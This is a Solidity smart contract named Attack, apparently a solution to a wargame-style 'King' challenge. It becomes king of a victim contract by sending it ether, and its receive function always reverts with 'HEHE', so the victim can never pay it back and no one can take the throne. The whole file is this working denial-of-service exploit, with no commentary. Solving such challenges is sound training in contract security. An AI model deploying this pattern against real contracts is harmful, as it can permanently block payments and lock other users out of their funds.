// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack{
    
    address payable public owner;
    
    constructor(address payable _victim) public payable {
         owner=_victim;
    }
    
    function becomeKing() public {
        (bool success, ) = payable(address(owner)).call{value: 10000}("");
        require(success, "External call failed");
    }
    
    receive() external payable {
        revert("HEHE");
    }
}